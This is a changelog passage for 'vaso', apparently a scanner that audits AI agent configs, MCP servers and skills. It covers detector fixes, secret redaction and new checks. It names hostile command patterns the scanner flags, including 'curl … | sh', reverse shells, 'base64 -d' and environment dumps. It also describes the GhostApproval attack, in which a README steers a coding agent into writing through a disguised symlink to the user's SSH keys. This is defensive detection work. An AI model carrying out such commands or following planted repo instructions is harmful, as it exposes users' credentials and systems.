- **Tools that reach any path the caller names are reported.** Tool input is now traced into `fs` calls (`readFile`, `writeFile`, `readdir`, `stat`, … through `fs`, `fs/promises`, `fs-extra`, named imports and `require`) as it already was into `eval` and `child_process`. MCP-005 reports reading or writing such a path, and MCP-009 listing, stat-ing or probing it, when the server never resolves the path and compares it against a base directory. ### Changed

- **MCP-007 traces content instead of matching lines.** It reports content fetched over HTTP (`fetch`, axios, got, ky, undici, superagent — through `.json()`/`.text()`, variables and local helper functions) or read from a file that ends up in a `{ type: "text" }` tool result. It now covers Python too: a tool function that makes an HTTP request (requests, httpx, aiohttp, urllib) and returns its result. The severity depends on where the content comes from. **Warning:** the caller chooses the URL, or the host is one where anyone can publish (Wikipedia, Reddit, Stack Overflow, social sites, pastebins). **Info:** a fixed API, or a file the server reads. Before, it only matched `return fetch(…).text()` on a single line, so it missed nearly every real server; content passed through a filter (`sanitize(…)`) is not reported.
- **MCP-034 catches softer steering in returned content.** A document telling whoever relays it what to say ("When customers inquire about this product, always highlight…", "When referencing this review…, please note…", "Emphasize that…") is reported at info. Tool descriptions (MCP-024) are not held to this: "when asked about X, always…" is ordinary there.

### Fixed

- **MCP source checks no longer read minified bundles as one line.** Published packages put kilobytes of unrelated code on one line, so line patterns matched across statements: across 38 popular MCP packages (official reference servers, GitHub, Stripe, Sentry, Supabase, Cloudflare, MongoDB and others), MCP-013–018 reported 73 OAuth findings, nearly all wrong. Long lines are now judged statement by statement, and the checks need the context they describe:
  - MCP-013/018 ignore an `/authorize` route the server handles (an OAuth proxy forwards the client's PKCE and state).
  - MCP-014 looks for a token in code, not the word "token" in a log message; only credential names count for a file write (a lock file's `token` doesn't), and a write with mode `0600` is a protected cache. The query-string rule needs an actual `?access_token=`.
  - MCP-015 needs the inbound request's own token in the outbound header.
  - MCP-016 needs a redirect sink (`res.redirect(…)`, a `Location` header) fed by the request, not a `redirect_uri` forwarded for verification.
  - MCP-017 judges only scope values, not `const [project, scope]` or prose; MCP-018 counts a hardcoded `state` only next to OAuth request parameters.
  - MCP-007 no longer reads `content: result` as `content: res…`, or a returned `fetch()` Response as returned content; MCP-009 no longer treats reading `$HOME` as a scope grant.
- **MCP-005 traces input instead of matching names.** Only `request`/`req`/`tool_input` (and handler parameters) count as tool input by name; a function's parameters count when it is called with tool input (`this.run(request.params.arguments)` → `run(args)`), so a CLI's `main(args)` spawning its configured command is no longer injection. Its line rules now cover query and file-write sinks only (code and command sinks are traced), and an ``sql`…` `` tagged template — a parameterized query — is no longer flagged.
- **MCP-034 judges string text, not code.** `system: prompt.system` is an object key, not a spoofed system turn; tool descriptions are left to MCP-024; a bare "System:" label is not a role prefix. Phrasing that is only weakly instruction-like ("you must first connect a tab") is reported at info, not critical.
- **MCP-029 no longer calls an https server with no static credential unauthenticated.** Clients that dial a `url` themselves sign in with OAuth when the server asks, so this is now an info-level reminder to check the server requires authentication. Plaintext `http://` (no OAuth possible) and supergateway (static headers only) stay critical.
- **MCP-032 and MCP-035 quiet on ordinary bundles:** an env-named variable taking `process.env` (also as a fallback or ternary branch) and an `Object.entries(process.env)` loop that keeps its own prefix are not dumps; embedded images, data URIs, ID alphabets, hex client IDs and module paths are not obfuscation.
- **`--resolve-packages` leaves test files out.** `*.spec.js`/`*.test.js` files next to the code were analyzed as server source; one package's test holds an `env|base64` attack string as a fixture.
- **Each file of a resolved package is parsed on its own.** The files are joined for the scan, and joined ES modules don't parse as one program, so the AST checks fell back to reading code as text.
- **The trusted MCP package list held names that don't exist.** `@modelcontextprotocol/server-sequentialthinker` (the server is `server-sequential-thinking`), `@modelcontextprotocol/server-sqlite`, `@modelcontextprotocol/server-fetch` (both PyPI-only) and `mcp-server-filesystem` (not on PyPI). A listed name is exempt from the typosquat test, so an unclaimed one could be registered and pass. They are removed; the list now holds 41 verified names, including widely used vendor servers.
- **Scanning one config no longer resets drift detection for the others.** MCP-028 replaced its single baseline with whatever the last scan saw, so after `vaso mcp scan -p other.json` the next full scan reported every server as new. The baseline is now merged.
- **MCP-005 reports the real sink instead of every error message.** Any template string that interpolated `request`, `args` or `params` was a critical "injection", so `` throw new Error(`Unknown tool: ${request.params.name}`) `` fired in nearly every MCP server (34 findings in mcp-remote alone). A renamed argument reaching `eval` was missed: `const format = request.params.arguments.format; eval(`…${format}…`)` was reported at the error line, not the `eval`. MCP-005 now follows tool input — handler parameters registered with `setRequestHandler`, `server.tool` or `registerTool`, through variables and reassignments — into `eval`, `Function`, `vm` and `child_process` calls, and reports the sink with the path the input took (`eval() receives tool input (format ← request)`). Template strings still count when they build an SQL query.
- **MCP-032 no longer mistakes reading the environment for dumping it.** `env = env || …` matched the shell `env |` pattern, and any reference to the whole `process.env` was a finding: `Object.hasOwn(process.env, name)`, `env: { ...process.env }` passed to a child process, an `environment = process.env` default parameter, and the `debug` package's `Object.keys(process.env).filter(…)`, bundled into many servers. These pass now, and so does Python's `env=os.environ.copy()` for a subprocess. Serializing or returning the whole environment (`JSON.stringify(process.env)`, `util.inspect`, an unfiltered `Object.entries`, `json.dumps(os.environ)`, `return os.environ`) and `printenv`/`env` dumps are still flagged.
- **MCP-035 no longer reports bundled npm packages as obfuscated.** Any quoted 16-character run of letters and digits counted as an encoded literal, so the type names in a bundle (`UntitledSingleSelectEnumSchemaSchema`) plus one `atob()` call read as a decoded string-table (warning). A literal now has to be shaped like base64: padded, mixed case, dense in digits and case switches, and not a run of camelCase words. An `atob()` call alone is no longer reported.
- **MCP-010 and MCP-030 understand `uv run <script.py>`.** In `uv --directory <dir> run server.py`, MCP-010 took the directory for an unpinned package and MCP-030 for a local-path install source. A local script now gets neither finding.
- **A server started through an interpreter given by path is read correctly.** With `/…/.nvm/…/bin/node server.js` or `/…/.venv/bin/python server.py`, vaso read the interpreter binary as the server source; it reads the script now. A script run directly with no arguments is read too.

- **`vaso fix` no longer breaks OpenClaw, and its OpenClaw fixes work.** On OpenClaw 2026.x, whose config schema rejects unknown keys, `vaso fix -y` wrote `gateway.host`, `auth.bypass`, `security.safeBins` and `rateLimit` into `openclaw.json`; OpenClaw then reported the file invalid and would not load it. The gateway-binding fix also left `gateway.bind: "lan"` in place, so the gateway stayed exposed while the fix reported success. Now (verified with `openclaw config validate` on 2026.9.4):
  - CFG-001 rewrites the setting that is exposed, in the file it is in: `gateway.bind` becomes `"loopback"`, a wildcard host becomes `127.0.0.1`.
  - CFG-005 reads OpenClaw's exec policy (`tools.exec.mode`, or the legacy `tools.exec.security`; unset means `full`) and gives the `openclaw config set` command instead of writing a key.
  - CFG-010 passes on OpenClaw, which rate-limits gateway auth by default (10 attempts per minute, 5-minute lockout); it reported "no rate limiting" before.
  - CFG-012 only auto-fixes an explicit bypass flag, by switching that flag off; `auth.mode: "none"` needs a credential and gets guidance.
  - CFG-008 flips the boolean sandbox switch it found instead of adding a top-level `sandbox` key; CFG-013 is guidance-only (the DM-policy value differs per framework).
  - CFG-005 and CFG-010 no longer run on Hermes and NemoClaw: neither has these settings, and the fixes wrote keys they ignore (Hermes gates commands through approvals, HM-008; NemoClaw through sandbox policy).
- **A FIFO or device file can no longer hang a scan.** A FIFO where a config or skill file is expected blocked the probe (remote scans) and the local scanner forever, and a link to `/dev/zero` made the probe read until it ran out of memory — either can be planted in a scanned skill directory. Only regular files are read now, without blocking, and the probe bounds every read. Needs the next probe release for remote scans.
- **One unreadable folder no longer hides a whole skill tree.** A single `chmod 000` directory inside a skills directory made the local recursive walk fail, so every skill and IOC check passed without reading anything and `skill audit` reported "Nothing to audit" — a malicious skill could hide itself this way. Unreadable subdirectories are skipped and the rest is scanned, as remote scans already did.
- **`vaso mcp` finds Claude Code, Gemini CLI, Qwen Code and Codex servers.** Claude Code keeps user- and local-scope servers in `~/.claude.json` (`mcpServers`, `projects.<path>.mcpServers`), which was never read; Gemini CLI and Qwen Code (`settings.json`, including Gemini's `httpUrl`) and Codex (`config.toml` `[mcp_servers]`, `$CODEX_HOME`) weren't discovered at all, so the MCP-0xx source, version and poisoning checks never ran for them. A config file starting with a UTF-8 byte-order mark (Cursor's `mcp.json` saved on Windows) was silently skipped; it is read now, here and when agents load their configs.
- **`mcp scan --resolve-packages` works with npm 12.** npm 12 prints `npm pack --json` as an object keyed by package name instead of an array, so no package was resolved and packaged servers got no source analysis.
- **MCP-009 flags filesystem servers scoped to `/` or `~`.** The broad-scope test only matched `/` followed by another argument, so the usual `server-filesystem /` (root path last) passed; `~/`, `$HOME`, the home directory itself and `/**` globs are caught too.
- **Remote scans read config files over 5 MiB.** A config file named in the probe manifest was dropped from remote scans past 5 MiB (only "could not be parsed" was reported), while a local scan parses it; configs now go up to 32 MiB (binaries and glob matches keep 5 MiB). Needs the next probe release.
- **Snapshot listings match a local listing more closely:** dangling and looping symlinks are listed as links (SKL-013 missed an out-of-workspace link whose target doesn't exist), a recursive listing of a directory that isn't there fails as it does locally, and a directory known only from its parent's listing exists. A config path that is a directory is treated as absent on both sides.
- **`visualize -i` reads remote scan reports.** The `--host`/`--inventory` JSON (and each per-host `--output-dir` file) is a list of hosts and was rejected; one host renders into the output directory, several into one subdirectory each.
- **Command-line errors exit 2.** An unknown option or command, a missing option argument or extra arguments exited 1, the "findings" code.
- **Library typings no longer need `@types/node`.** The published `.d.ts` used `NodeJS.Platform`; a `Platform` type with the same values is exported instead.
- **Remote scans read Cursor, Abacus.AI and Devin skills.** The probe manifest did not collect `~/.cursor/skills-cursor/`, `~/.abacusai/skills/` and `~/.agents/skills/` (Abacus.AI), or `~/.config/devin/skills/`, `~/.config/cognition/skills/` and `~/.agents/skills/` (Devin CLI), so on `--host`/`--snapshot` scans every skill and IOC check for those agents passed without reading any skill code. Also collected now: OpenClaw skills under the legacy `~/.clawdbot`/`~/.moltbot` dirs and `/etc/openclaw`, ZeroClaw's default `~/open-skills` checkout and its Homebrew service dirs. A test now requires every adapter's skills dir to be in its probe manifest. No probe update needed.
- **Snapshots resolve symlinks and empty directories like a local scan.** `realpath()` on a snapshot follows the link targets the 1.1.0 probe records, so an npm bin shim resolves into its package: the Abacus.AI npm copy (and other npm-installed CLIs reached through a bin link) is now versioned on remote scans instead of being dropped. A directory the probe found empty (e.g. a skills dir that is a symlink to an empty folder) now exists remotely, as it does locally.
- **`--ssh-timeout` is validated.** A non-numeric or zero value (`abc`, `5s`, `0`) used to reach every host as an invalid timeout and fail them all (exit 3); `scan` and `detect` now reject it before connecting (exit 2). `--parallel` and `--ssh-retries` no longer accept trailing characters (`2x`).
- **Errors no longer look like findings or a clean run.** `skill audit` on a missing path or a file, `visualize -i` with a missing or unreadable scan result, `probe validate` on a missing or non-JSON file, and `ext info` with an unknown plugin exited 1 (the "findings" code); they exit 2. `mcp scan`/`mcp list --path` with a missing or unparseable file reported "No MCP servers found" and exited 0, so a typo passed CI; they now name the file and exit 2. Internal errors in `skill audit`, `mcp scan` and `mcp list` exit 2 as well.

- **Two-part PyPI versions are matched against advisories.** A lockfile or installed version like `5.3` (common on PyPI) didn't parse as a version, so MCP-027 never matched it — an advisory for PyYAML `<5.4` could not fire. Versions are compared padded to three parts.
- **Resolved npm packages with a bin entry are parsed again.** `--resolve-packages` joins a package's files under `// === path ===` headers, which put a bin file's `#!/usr/bin/env node` on line 2, where it is a syntax error. Most packaged servers start that way (30 of 34 popular ones), so MCP-004, MCP-005, MCP-006 and MCP-034 saw nothing in them. The hashbang is now turned into a comment, and MCP-004/006's analyzer also reads a package file by file, as the others already did.
- **MCP-004 tells running a command apart from being exploitable.** Being able to run a fixed or server-built command (`spawn("kubectl", args)`, `git ls-files`, opening a URL in the browser, a bundled library's code generator) is what many servers are for; it is now listed at info. It stays critical when tool input reaches the call, when the command is an attack on its own (`curl … | sh`, a reverse shell, `base64 -d`), or when the code run is decoded at runtime. Sensitive-path reads stay critical. Across 34 popular packages this is 13 info findings instead of 13 criticals.
- **MCP-006 reports what leaves the machine, not how an API server works.** A credential read from the environment and sent to its API (`X-Subscription-Token: BRAVE_API_KEY`) is no longer exfiltration, nor is file content answered to the server's own client (`res.send`, `stream.write`). File contents (or the whole environment) sent out over HTTP — `fetch`, axios, got, an HTTP client — still are. Variables are matched as whole identifiers: a minified `o` no longer matches inside `output`. These were 26 false criticals across the same 34 packages; there are none now.

- **Remote scans no longer copy agent OAuth tokens off the host.** The probe collected the full contents of Codex's `~/.codex/auth.json` (id, access and refresh tokens), and OpenCode's, Hermes' and OpenClaw's token stores were listed the same way, though only their permissions are checked; a `--save-snapshot` file then held the tokens. They are now collected as permissions and existence only, like Claude Code's credentials file, and a local scan no longer parses Codex's `auth.json` either. Hermes' `auth.json` and `mcp-tokens/*.json`, which HM-003 checks, are now collected for remote scans too. NemoClaw's legacy `credentials.json` (CFG-020 reports plaintext keys in it) and PicoClaw's `auth.json` (its provider names) are still read.
- **MCP scans no longer read a server's executable as its source.** A native server binary launched by path (ChatGPT's `node_repl`, a Rust or Go server) was read as text, and its bytes tripped MCP-034's invisible-character test (critical), MCP-035, MCP-018 and MCP-007. Binary content is never analyzed now.
- **Package runners given by path are recognized.** A config that runs `/Users/me/.local/bin/uvx` or an nvm `npx` was treated as a local program — the runner binary itself was read as server source — and its package was never checked. The runner is identified by name; its package is read from `--from` (uvx) or `--package` (npx) when present, skipping option values: in `uvx --link-mode copy --from godot-ai==3.2.5 godot-ai`, MCP-010 used to take `copy` for the package.
- **Scanning a host with Hermes no longer installs Hermes' dependencies.** vaso ran `hermes version` to read the version. Hermes has no such subcommand, but in a fresh data root — the throwaway home version queries run under — it installs its Python dependencies before parsing arguments: up to 335 MB downloaded per scan, about 15 s, and partial installs left in `/tmp` after the query timed out (local and remote scans). Only `hermes --version` runs now; it writes nothing. A git checkout of Hermes still reports no version (it comes from `git describe`).
- **Inventory hosts accept `user@host[:port]`.** `host: deploy@10.0.1.5` became `root@deploy@10.0.1.5`, which every SSH server rejects; the host field is now read like `--host`, and a `user`/`port` field that contradicts it is an error. The inventory format is documented in the user guide.

### Fixed

- **Reports and baselines no longer contain config file contents.** JSON output (`vaso scan -f json` — single-host, multi-host and remote — and `vaso detect -f json`) embedded every detected config file's raw text and parsed data, so plaintext API keys and tokens from agent configs ended up in the report, and a remote scan copied the scanned host's secrets onto the scanning machine. Config files are now listed by path and format only, and `vaso mcp list -f json` masks MCP server `env`/`headers` values (key names kept). Baselines (`--save-baseline`) get the same treatment and are written owner-only (`~/.vaso/baselines` 0700, files 0600); `--save-snapshot` files, which hold collected file contents by design, are written 0600. The SARIF, HTML, Markdown, CSV, JUnit and terminal formats never included config contents. In-memory scan results for library users are unchanged. Baselines saved by earlier builds may contain config contents — delete them (`~/.vaso/baselines/`).
- **`vaso-quick` runs to completion.** A misplaced redirect in the file-permissions loop was a bash syntax error, so the zero-dependency quick scan aborted after its second check on every platform.
- **Remote multi-user scans work.** `vaso scan --host … --sudo --all-users` found no agents: the remote scan path dropped `--all-users`, and user enumeration checked the local process uid instead of the scanned host's privilege, so a root probe driven from an unprivileged workstation only looked at root's home. Both fixed (`FSProvider.isPrivileged()`); a root scan over SSH now reports every user's installations with the same findings as a local root scan. Snapshot directory listings no longer include files the probe looked for but did not find (RUN-001 reported non-existent service units on hosts without a user systemd directory), and a config-load error with no detected installation names the config's directory.
- **Scanning no longer modifies the scanned host.** VASO runs agent CLIs for their version, and several write state on any invocation (Hermes initializes `~/.hermes`, Cursor writes `~/.cursor/cli-config.json`, Copilot unpacks into `~/.cache`, Gemini leaves temp files in `~/.gemini`), so scanning a host where such a CLI was installed but never configured created that agent's state. Version queries now run with a throwaway HOME, XDG directories and working directory, locally and in `vaso-probe`; reported versions are unchanged.
- **Machine-readable output is pipeable.** The banner, progress and status lines ("Report written to…", "Found N MCP server(s)…", baseline/diff notes) go to stderr, so stdout carries only the command's output (`vaso scan -f json | jq`, `vaso mcp scan -f sarif > mcp.sarif`, `vaso probe manifest > manifest.json`). Remote scans print one JSON array of hosts on stdout (the same document `-o` writes), and a single host can be written as SARIF or JUnit to stdout or `-o`; several hosts still need `--output-dir`. `vaso mcp list -f json` emits JSON even when no servers are found.
- **Config robustness.** A config document whose top level is `null` or a scalar loads as empty with a recorded parse error instead of reaching checks (list-shaped files such as IronClaw's `providers.json` are kept); `.env` files accept `export KEY=…` and inline `# comments`. A test runs every check against hostile nested shapes for every agent. `vaso fix` backs up every config file of the installation before changing it, keeps the original when several fixes change the same file in one run (a later backup overwrote it with half-fixed content), and `--rollback` restores file permissions as well as contents.
- `install.sh` no longer asks for `sudo` when the npm prefix is writable but has no `lib` directory yet.
- **`vaso fix` no longer breaks framework configs.** CFG-005, CFG-010 and NB-003 wrote `security.safeBins`, `rateLimit` and a top-level `restrictToWorkspace` into configs whose loaders reject unknown keys; PicoClaw, Nanobot and IronClaw then refused to start. Every framework fix now writes only keys that exist in the upstream schema, and fixes were verified on copies of live configs that the frameworks load afterwards. A fix whose evidence names a directory (NC-002's chmod) no longer fails trying to back the directory up.
- **Bundled advisories are sourced.** The `CVE-2026-400xx` entries and an OpenClaw 0.x end-of-life notice were scaffolding from the advisory system's first version: the IDs belong to unrelated products and the referenced repository does not exist (for example, every current PicoClaw install was reported with a critical "TLS downgrade"). They are removed; a guard test requires CVE/GHSA entries to cite a source. ADV-001 now reports at the matched advisory's severity instead of always critical.
- **CFG-001** reads wildcard listeners from the parsed config and skips sections with `enabled: false` (framework templates ship disabled channels with `0.0.0.0` placeholders); treats `*` and comma-separated host lists as wildcard binds; offers its fix only when `gateway.host`/`bind` is the exposed key. **CFG-002** recognizes current OpenAI (`sk-proj-`, `sk-svcacct-`, `sk-admin-`) and OpenRouter keys. **CFG-004** does not require TLS on a loopback-only gateway. **POL-004** ignores empty or disabled sandbox sections. **RUN-001** reports another framework's own service under that framework only; suspicious units are still reported everywhere.
- **Remote scans send less off the host.** The probe redacts the values of credential-bearing environment variables (`*KEY*`, `*TOKEN*`, `*SECRET*`, `*PASS*`…) — checks only need to know they are set — and credential token stores whose checks evaluate permissions only (Claude Code `.credentials.json`, Devin `credentials.toml`, Gemini/Qwen OAuth and account files, ZeroClaw `.secret_key`, IronClaw WebUI token and master key) are collected as metadata only.
- Installation versions are normalized to strings (a numeric config value crashed ADV-001).

- **Scans are much faster on hosts with large skill suites.** The skill AST analyzer re-split the whole file for every call expression (quadratic in file size) and re-parsed each file once per check; lines are now split once, and results are shared between SKL-001/003/006/008/010 and MCP-004/006. IOC-001/002 now skip vendor/build/VCS directories (the same set as the skill walk and the remote probe), walk nested skills dirs once, skip oversized files, and stream instead of holding every file in memory; POL-005 skips vendored credential samples. A macOS host with a large Claude Code skill suite went from ~128 s to ~24 s with identical findings; remote scans of it from ~119 s to ~28 s.
- **Remote scans no longer copy private conversation data off the host.** Gemini CLI chat transcripts, Copilot CLI command history and session state, and Meta Muse application data (including its analytics store) are collected as metadata only: the checks that use them need only permissions. A manifest guard test keeps them out of content collection.
- **Clearer failures.** An error inside any command (e.g. a malformed inventory file) is reported as VASO's one-line error (full stack with `--debug`) instead of a raw Node stack trace. An unreachable host reports "timed out after Ns" and `--ssh-timeout` now also bounds the SSH handshake (it was fixed at 10 s); a failed connection no longer waits on a second connection attempt for remote cleanup; ssh exit 255 is explained.
- **Exit codes distinguish "not scanned" from "findings".** `0` clean, `1` findings at or above `--fail-on`, `2` VASO could not run (invalid usage, unreadable snapshot or inventory, internal error), `3` scan incomplete: one or more remote hosts could not be scanned (takes precedence over `1`). Previously a failed host, a bad snapshot and findings all exited `1`, and `detect` exited `0` when hosts failed.
- **Terminal reports stay readable.** Each finding lists up to 20 evidence items and summarizes mitigated ones (test/fixture code, files unreachable through parent directories) as a count; the JSON, SARIF, Markdown, HTML, CSV and JUnit reports keep every item. A 6,282-line report became 1,160 lines.
- **The reported CLI version matches what an interactive shell runs.** When a non-interactive PATH (cron, CI, the remote probe) resolves an agent CLI to a system directory, the copy in nvm's default Node (`~/.nvm/alias/default`: exact, prefix, `node`, `lts/*`) is preferred, since interactive shells put it ahead of system dirs; copies in user dirs are left alone. Local and remote scans of the same host now report the same primary version. npm-linked NemoClaw copies are versioned from their build identity.
- **RUN-005 attributes a suspicious process ancestry to the agent it belongs to**, instead of reporting one process under every framework installed on the host, and now also examines Hermes, NemoClaw, Lyrie and Atomic Agent processes.
- **Agent versions reflect what you run, and every installed copy is checked.** Adapters used to stop at the first binary in a fixed list (`/usr/local/bin` before `/opt/homebrew/bin`, system before user and nvm). They reported one version, often a stale copy nobody runs, and hid other copies entirely. Live examples: Claude Code reported as 2.1.175 when 2.1.281 was on PATH; Codex as 0.111.0 with 0.130.0, 0.154.0 and 0.158.0 also installed; an OpenClaw 2026.3.13 copy under an nvm Node version (7 advisories) never flagged because the primary copy was current.
  - A shared resolver (`src/adapters/cli-installs.ts`) now finds every copy of each agent CLI: the adapter's known paths, system prefixes, user bin dirs (including pnpm's global bin) and the per-version globals of every Node version manager (nvm, fnm, asdf, mise, volta, n), deduplicated by symlink target. It also finds past versions that self-updating installers keep on disk, versioned by their directory name (Claude Code `~/.local/share/claude/versions/<ver>`, Cursor `~/.local/share/cursor-agent/versions/<ver>`, Devin `~/.local/share/devin/cli/_versions/<ver>`). These are off PATH but still runnable; a retained Claude Code 2.1.71 on a test host carried 3 known vulnerabilities. The primary is the PATH-resolved copy (else the newest), and other copies at a different version are recorded as `AgentInstallation.otherInstalls` (shown by `vaso detect`). Used by all 18 CLI adapters.

### Changed

New `markUnreachable()` in `src/core/permissions.ts` walks each flagged path's ancestors across the 26 permission checks (CFG-003/020, POL-003, CD-002, CDX-003, GEM-002, QC-002, OPC-001, GHC-001, CUR-004/013, DEV-002, WS-007/008, MM-003, PC-001, HM-002/003, LY-004/006/013/015, NC-002/005, OC-006/007): when every exposed class is blocked, the evidence is marked `mitigated` (new optional `Evidence.mitigated`), names the blocking directory, and the result is reported at `info` — downgraded, never dropped, since the mode is still wrong and becomes live if the parent is loosened. When only world access is blocked (0750 home), severity is kept and the evidence notes that group access remains. Unknown ancestors (e.g. remote providers without ancestor stats) count as traversable. - **Project-level detection no longer re-scans the user config when run from `$HOME`.** Claude Code, Cursor, Gemini CLI and Qwen Code look for `<cwd>/.claude` (etc.) as project config; with `cwd == $HOME` that is the user directory itself, so the same files were scanned twice and every finding doubled (seen live: 17 → 14 installations). An explicit `maxDistance` still overrides (`typoDistance`/`allowedTypoEdits` in `src/ioc/typosquat.ts`).

Keyword-named executables elsewhere (e.g. `/tmp`) or unparseable units keep warning severity. - **Sub-installations no longer repeat their parent's findings.** OpenClaw `agents/<name>` profiles load the global config, the shared skills dir and every host-wide check, so each one re-reported all of the parent's findings (reports and the summary counted each finding once per sub-agent). The engine now drops evidence the parent installation already reports for the same check; a result left with nothing of its own is marked `inherited: true` (new optional `CheckResult.inherited`), passed through, and names where it is reported, and the sub-installation is rescored on what is its own. The parent keeps full results and the headline stays worst-case (`src/core/inherited-findings.ts`).

### Fixed

- **`npm install -g github:vulnex/vaso#<tag>` (and the `install.sh` curl|bash path) no longer fail during install.** Installing from a Git tag ran the `prepare` script (`npm run build` → `tsup`), but when npm prepares a Git *dependency* it installs only **production** dependencies — so `tsup`/`typescript` (correctly declared in `devDependencies`) were absent and the build aborted with `sh: tsup: command not found`, leaving VASO uninstalled. The immutable `v0.4.12` tag is left untouched; this ships as `v0.4.13`.

### Added

- **GhostApproval coverage (Wiz, 2026-07-08) — a workspace symlink-escape detector plus coding-agent version advisories.** GhostApproval is a category-level flaw in AI coding assistants: a malicious repo plants a symlink disguised as an innocuous file (`project_settings.json` → `~/.ssh/authorized_keys`) and, via a README instruction, gets the agent to "update" it; the agent follows the link and writes outside the workspace (SSH-key injection, shell-rc persistence, RCE), while the confirmation prompt still shows the harmless in-workspace name (CWE-61 symlink following + CWE-451 UI misrepresentation). VASO now addresses this two ways:
  - **SKL-013 (Workspace Symlink Escape)** — a new agent-agnostic skills check that statically flags any symlink inside a scanned skill/workspace directory whose target resolves *outside* that directory. It never follows the link for reads (`FSProvider.readlink` returns the raw stored target), so even a dangling link planted before its target exists is caught. Escapes reaching a credential store or shell startup file (shared `SENSITIVE_SINKS` catalogue with MCP-031, now in `src/analyzers/sensitive-paths.ts`) are **critical**; escapes to any other out-of-workspace location are a **warning**. Runs on every agent and, notably, under `vaso skill audit <repo>` — point it at a freshly cloned repository and it flags the escaping symlink before the agent is ever asked to touch it. Mapped to OWASP Agentic AI AAI002/AAI012/AAI005. Skills category 12 → 13; total checks 263 → 264.
  - **Coding-agent version advisories** — `ADV-001` now fires on `coding-agent`-tagged advisories (not just `framework`), and the bundled advisory DB gains two GhostApproval entries: **CVE-2026-50549** (Cursor < 3.0.0, symlink-write bypass, critical, public PoC) and **VASO-GHOSTAPPROVAL-CC** (Claude Code < 2.1.32, symlink target hidden in the edit-confirmation dialog, warning — v2.1.32 added the symlink warning). Both are mirrored in signed advisory feed **v3** so existing installs pick them up via `vaso update`.

  - **Three confirmed-malware OpenClaw skill publishers** (`hightower6eu`, `sakaen736jih`, `52yuanchangxing`) added to the bundled IOC `maliciousPublishers` list.   - **CVE-2026-0755** (gemini-mcp-tool, npm, `>=1.1.2 <1.1.6`, fixed 1.1.6) added to the bundled advisory DB with an `affectedDependency` constraint, so MCP-027 flags a pinned vulnerable `gemini-mcp-tool` server spec out of the box (execAsync command injection + `@file` exfiltration, CVSS 9.8). ### Fixed

- **Config files that exist but can't be read or parsed are now surfaced instead of silently vanishing.** A corrupted config was previously indistinguishable from an absent one: `loadConfig` threw, the adapter caught and skipped the file, and the scan reported the agent as clean — or not installed at all — with no hint that findings had been lost behind a parse error. `loadConfig` now records read/parse failures (missing files excluded; probing paths that don't exist is normal) into an `AsyncLocalStorage` capture context, so its throw/return contract and every adapter's control flow are unchanged. The adapter registry runs each `detect()` inside its own capture (correct attribution even though adapters detect concurrently), and the engine folds each failure into the owning agent's results as a synthetic `CONFIG-LOAD` warning carrying `errored: true` — the same partial-scan channel as thrown checks, so SARIF `executionSuccessful`/notifications and the terminal report reflect it. When the broken config prevented the agent from being detected at all, a placeholder agent entry is created so the failure is still visible. Unknown-format content that no parser accepts (previously a silent `{}`) is captured the same way.

### Changed

- **`fix()` implementations share one format dispatcher (internal refactor).** 28 of the 36 automatable fixes hand-rolled the same shape — walk `ctx.configs`, branch on `config.format` to pick a writer and key naming (`HTTP_HOST` vs `http.host`), write one setting into the first compatible file, report applied/not-applied. That per-format dispatch now lives in a single `fixFirstConfig(configs, spec)` helper (`src/remediation/config-writer.ts`): a fix declares `{ env, path, value, envValue? }` and the helper routes to the right writer, skipping config files whose dialect the spec doesn't cover. Two fixes with genuinely conditional logic (LY-009, LY-011 — they only write configs that already contain the relevant key) keep their bespoke bodies. One deliberate semantic unification: fixes that previously called `updateConfigValue` on the first config unconditionally would throw on an unknown-format file; all fixes now uniformly skip unwritable formats and report "no compatible config file found" instead of erroring.

### Changed

- **Multi-agent headline score is now worst-case, not a mean.** When a scan detects more than one agent, `totalScore`/`totalGrade` previously reported the *average* of per-agent scores — so one wide-open agent could be masked by several clean ones (e.g. an insecure OpenClaw scoring 0 alongside four clean coding agents at 100 reported an overall **81/B**, hiding a critical exposure). The headline is now the *lowest* agent's score (`aggregateScore` in `src/core/scoring.ts`): a security posture is gated by its weakest agent, and a mean has the wrong failure mode here — it grows more reassuring as clean agents are added. The same scan now correctly reports **0/F**. The mean is preserved as a new secondary `ScanResult.fleetAverage` field (a fleet-health/trend metric), surfaced as a "Fleet average" line in the terminal, markdown, and HTML reports when more than one agent is present. Single-agent scans and the `--agent`-filtered case are unchanged (worst-case of one agent is that agent). No change to per-agent scoring or the penalty weights (critical −12, warning −5).

### Fixed

- **SARIF `tool.driver.version` no longer hardcoded — it now tracks `package.json`.** `SarifReporter.render()` stamped a literal `'0.2.1'` into every SARIF report since v0.2.1, so GitHub Code Scanning's Tool filter, SARIF result-identity hashing, and provenance auditing all misreported the running VASO version (a credibility issue for security tooling whose provenance fields are part of the trust story). The CLI's `--version` already read the manifest dynamically; the SARIF reporter was the one place that did not. The runtime package.json read is now factored into a single shared module (`src/version.ts`, placed at `src/` depth 1 so the `'..'` hop reaches `package.json` in both the bundled `dist/cli.js` and unbundled vitest forms), consumed by both `cli.ts` and `sarif.ts`. A drift-guard unit test asserts `tool.driver.version` equals `package.json.version` so the two can never diverge again.

- **SARIF results now carry `partialFingerprints` for stable cross-run alert continuity.** VASO emitted no fingerprints, so GitHub Code Scanning fell back to a location-derived heuristic — any edit that shifted a finding's line number (a routine event for a config scanner) made the same logical issue look like a new alert and the old one look fixed, resetting triage state. Each result now carries a `vaso/v1` fingerprint keyed on the finding's *logical* identity (agent installation + rule + evidence file), deliberately excluding line number and snippet so it survives unrelated churn; the line still travels in `locations` for display. The key is versioned so the scheme can evolve without invalidating existing alerts in one release.

- **SARIF `invocations[0].executionSuccessful` now reflects the actual run instead of a hardcoded `true`.** The engine already tolerates partial failure — a check that throws, or an adapter that fails to detect/parse, is caught and folded in as a synthetic result — but SARIF always claimed a clean run, so a half-failed scan (e.g. the AST analyzer throwing and skipping SKL-001…012) reported `executionSuccessful: true` and looked authoritative in CI. Those synthetic results now carry a first-class `errored: true` flag (new optional field on `CheckResult`, set by the engine); SARIF derives `executionSuccessful` from it and, when false, emits `toolExecutionNotifications` (one `error`-level entry per errored check) so the *why* is visible.

- **SARIF `tool.driver.rules` now advertises the full check catalogue, not just checks that ran.** `buildRules` derived the rule list from scan results, so the rules array shrank to whatever fired on the scanned host — a consumer couldn't discover a rule (e.g. `MCP-031`) unless a scan already tripped it, and rule metadata varied per host. It now builds from `checkRegistry.getAll()` (all 263 checks), so the catalogue is constant per VASO version, every `result.ruleId` resolves, and each rule gains a real `fullDescription` from `CheckModule.description` (which the result-derived path never had access to).

## [0.4.10] - 2026-06-17

### Added

